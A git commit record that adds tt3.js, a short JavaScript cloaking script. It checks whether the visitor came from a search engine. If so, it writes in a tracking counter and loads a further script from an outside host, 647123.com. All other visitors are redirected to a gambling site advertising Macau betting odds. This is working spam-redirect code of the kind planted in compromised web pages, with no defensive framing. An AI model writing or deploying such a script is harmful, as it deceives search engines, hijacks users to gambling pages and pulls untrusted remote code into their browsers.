1470eec3db01b71bf68694d7d8414c7e010908bd
js999999999 <js-9@outlook.com>
2017-06-20 11:20:08 +0800

    Create tt3.js

---
+++ 2017hh/tt3.js
@@ -0,0 +1,11 @@
+today=new Date();
+today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();
+var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+){1,2}\//ig;
+var where =document.referrer;
+if(regexp.test(where)){
+document.write ('<script language="javascript" src="http://count47.51yes.com/click.aspx?id=477877085&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/2017hh/t.js "></script></div>');
+}
+else
+{
+window.location.href="http://www.24499.com/#澳门永利（特码48.5倍）";
+}
